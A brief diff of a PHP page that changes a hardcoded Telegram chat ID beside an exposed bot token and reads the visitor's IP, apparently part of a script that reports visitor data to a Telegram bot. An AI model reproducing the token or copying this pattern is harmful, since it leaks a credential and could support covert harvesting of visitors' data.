@@ -105,7 +105,7 @@ error_reporting(E_ALL);
 <body>
 <?php
   $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
-  $chatID = "1064643518";
+  $chatID = "-4196036211";
 
   
   $userIP = $_SERVER["REMOTE_ADDR"];
